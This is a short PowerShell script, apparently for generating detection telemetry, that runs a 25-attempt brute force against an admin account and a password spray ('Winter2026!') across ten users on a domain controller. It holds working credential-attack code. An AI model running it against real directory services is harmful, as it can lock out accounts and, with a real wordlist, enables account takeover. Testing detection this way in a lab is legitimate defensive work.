$ErrorActionPreference = "SilentlyContinue"
# FORCE IP AND EXPLICIT DOMAIN CONTEXT
$TargetDC      = "192.168.0.63" 
$DomainName    = "KIAMSOLUTIONS"
$TargetUser    = "adm-jbutler"
$FakePassword  = "InvalidSecurePass123!"

$UserDirectory = @(
    "eexecutive1", "jdoe", "asmith", "mross", "bwayne", 
    "clent", "pparker", "dfox", "twright", "bbutler"
)

function Invoke-BruteForce {
    param ([string]$Username, [int]$Attempts)
    Write-Host "[!] INITIATING HIGH-VELOCITY BRUTE FORCE TARGETING: $Username" -ForegroundColor Red
    for ($i = 1; $i -le $Attempts; $i++) {
        # Force Domain Context using the explicit IP address path
        $Context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext(
            [System.DirectoryServices.AccountManagement.ContextType]::Domain, $TargetDC
        )
        $Validate = $Context.ValidateCredentials($Username, ($FakePassword + $i))
        Write-Host "    [-] Execution $i/$Attempts sent for user: $Username" -ForegroundColor DarkGray
    }
}

function Invoke-PasswordSpray {
    param ([array]$UserList, [string]$Password)
    Write-Host "[!] INITIATING ENTERPRISE PASSWORD SPRAY SIMULATION" -ForegroundColor Yellow
    foreach ($User in $UserList) {
        $Context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext(
            [System.DirectoryServices.AccountManagement.ContextType]::Domain, $TargetDC
        )
        $Validate = $Context.ValidateCredentials($User, $Password)
        Write-Host "    [-] Authentication failure dropped for: $User" -ForegroundColor DarkGray
        Start-Sleep -Milliseconds 250
    }
}

Clear-Host
Write-Host "=========================================================" -ForegroundColor Cyan
Write-Host "     KEYSTONE IAM SOLUTIONS - SECURITY TELEMETRY ENGINE  " -ForegroundColor Cyan
Write-Host "=========================================================" -ForegroundColor Cyan
Invoke-BruteForce -Username $TargetUser -Attempts 25
Invoke-PasswordSpray -UserList $UserDirectory -Password "Winter2026!"